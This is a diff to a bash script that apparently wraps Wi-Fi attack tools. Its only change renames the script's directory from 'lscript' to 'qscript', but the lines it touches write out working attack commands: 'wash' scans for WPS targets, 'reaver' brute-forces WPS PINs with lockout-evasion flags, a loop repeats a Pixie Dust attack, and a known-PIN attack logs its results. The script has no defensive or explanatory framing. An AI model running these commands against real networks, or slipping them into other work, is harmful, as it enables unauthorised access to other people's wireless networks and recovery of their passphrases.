@@ -1,12 +1,12 @@
 #! /bin/bash
 
-WLANNM=$(cat /root/lscript/wlanmon.txt)
+WLANNM=$(cat /root/qscript/wlanmon.txt)
 export WLANNM
 SCW=1
 function defaults_lh3
 {
-#path for lscript
-	LPATH="/root/lscript"
+#path for qscript
+	LPATH="/root/qscript"
 	export LPATH
 #path for keyboard shortcuts
 	KSPATH=""$LPATH"/ks"
@@ -244,7 +244,7 @@ function scan_wash
 		echo -e "Scaning in new terminal..."
 		echo -e ""$YS"PRESS CTRL C IN WASH WHEN READY."$CE""
 		sleep 1
-		xterm -geometry 80x25+9999+9999 -T "Press Ctrl C when ready" -e "wash  -i $WLANNM | tee /root/lscript/tempwash "
+		xterm -geometry 80x25+9999+9999 -T "Press Ctrl C when ready" -e "wash  -i $WLANNM | tee /root/qscript/tempwash "
 	fi
 		SCW=1
 		clear
@@ -545,7 +545,7 @@ function reaver_attack
 		DELAY=60
 	fi
 	#xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
-	reaver -i $WLANNM -b $BSSIDT -c $CHANT -d $DELAY -L -f -N -vvv | tee /root/lscript/wpslog
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -d $DELAY -L -f -N -vvv | tee /root/qscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read	
 }
@@ -568,7 +568,7 @@ function pixie_loop
 	do
 		trap 'break' SIGINT
 		echo "" > "$LPATH"/wpslogloop
-		reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -K 1 -f -vvv <<< $'y\n' | tee /root/lscript/wpslogloop
+		reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -K 1 -f -vvv <<< $'y\n' | tee /root/qscript/wpslogloop
 		if [[ -f "$LPATH"/wpslog ]]
 		then
 			TTT=$(cat "$LPATH"/wpslogloop | grep "WPS pin not found!")
@@ -613,7 +613,7 @@ function pixie_attack
 	dash_calc
 	printf '\033]2;PIXIE DUST ATTACK\a'
 	#xterm -geometry 90x70+0+0 -e "aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
-	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust -vvv | tee /root/lscript/wpslog
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust -vvv | tee /root/qscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read
 }
@@ -635,7 +635,7 @@ function associate_aireplay
 }
 #~ function wash_awk
 #~ {
-#~ file="/root/lscript/tempwash"
+#~ file="/root/qscript/tempwash"
 #~ linestotal=$(cat $file | awk 'END{print NR}')
 #~ lines=$((linestotal-7))
 #~ n=1
@@ -692,7 +692,7 @@ function associate_aireplay
 
 function wash_awk
 {
-file="/root/lscript/tempwash"
+file="/root/qscript/tempwash"
 linestotal=$(cat $file | awk 'END{print NR}')
 lines=$((linestotal-2))
 n=1
@@ -1059,7 +1059,7 @@ then
 		echo -e "Enter your target's WPS pin: "
 		read -e WPST
 		clear
-		reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/lscript/wpslog
+		reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/qscript/wpslog
 		echo -e "Press "$YS"enter"$CE" to go back"
 		read
 	else
@@ -1185,7 +1185,7 @@ then
 	fi
 elif [[ "$YN" = "11" ]]
 then
-	cat /root/lscript/wpslog
+	cat /root/qscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read
 elif [[ "$YN" = "0" ]]
